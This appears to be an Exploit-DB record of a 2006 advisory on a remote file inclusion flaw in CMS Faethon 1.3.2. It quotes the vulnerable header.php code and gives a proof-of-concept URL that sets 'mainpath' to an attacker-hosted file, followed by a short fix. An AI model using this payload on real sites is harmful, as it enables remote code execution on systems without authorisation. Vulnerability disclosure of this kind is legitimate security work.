{
  "id": "1919",
  "title": "CMS Faethon 1.3.2 - &#039;mainpath&#039; Remote File Inclusion",
  "cve": "CVE-2006-3186",
  "vuln_type": "rce",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\  \r\n |    __)_ /    \\  \\//    ~    \\/   |   \\ \r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/ \r\n\r\n\t\t\t\t\t.OR.ID\r\nECHO_ADV_33$2006\r\n\r\n---------------------------------------------------------------------------\r\n[ECHO_ADV_33$2006] CMS Faethon 1.3.2 mainpath Remote File Inclusion\r\n---------------------------------------------------------------------------\r\n\r\nAuthor       : M.Hasran Addahroni a.k.a K-159\r\nDate         : June, 16th 2006\r\nLocation     : Indonesia, Bali\r\nWeb          : http://advisories.echo.or.id/adv/adv33-K-159-2006.txt\r\nCritical Lvl : Highly critical\r\nImpact       : System access\r\nWhere        : From Remote\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nCMS Faethon \r\n\r\nApplication : CMS Faethon \r\nversion     : 1.3.2\r\nURL         : http://cmsfaethon.com/\r\nDescription :\r\n\r\nCMS Faethon is content management system for different web pages.\r\n\r\n---------------------------------------------------------------------------\r\n\r\nVulnerability:\r\n~~~~~~~~~~~~~~~\r\n\r\nin folder data we found vulnerability script header.php.\r\n\r\n-----------------------header.php----------------------\r\n....\r\n<?php\r\n        include($mainpath . 'survey.php');\r\n        ?>\r\n        <h2>RSS - cmsfaethon.com</h2>\r\n        <div class=\"rss-menu\">\r\n                <?php\r\n                $source = 'http://cmsfaethon.com/feed/articles/rss2.php?LangSet=cs';\r\n                include($mainpath . 'rss-reader.php');\r\n        ?>\r\n...\r\n----------------------------------------------------------\r\n\r\nVariables $mainpath are not properly sanitized.When register_globals=on and allow_fopenurl=on an attacker can exploit this vulnerability with a simple php injection script.\r\n\r\nProof Of Concept:\r\n~~~~~~~~~~~~~~~~\r\n\r\nhttp://target.com/[cms_faethon_path]/data/header.php?mainpath=http://attacker.com/evil.txt?\r\n\r\nSolution:\r\n~~~~~~~~\r\n\r\nsanitize variabel $mainpath in header.php\r\n\r\n\r\n---------------------------------------------------------------------------\r\nShoutz:\r\n~~~~~~\r\n~ ping - my dearest wife, for all the luv the tears n the breath \r\n~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,anonymous,kaiten\r\n~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,an0maly,fleanux,baylaw\r\n~ sinChan,x`shell,tety,sakitjiwa, m_beben, rizal, cR4SH3R, metalsploit\r\n~ newbie_hacker@yahoogroups.com \r\n~ #aikmel #e-c-h-o @irc.dal.net\r\n---------------------------------------------------------------------------\r\nContact:\r\n~~~~~~~\r\n\r\n     K-159 || echo|staff || eufrato[at]gmail[dot]com\r\n     Homepage: http://k-159.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2006-06-16]",
  "url": "https://www.exploit-db.com/exploits/1919"
}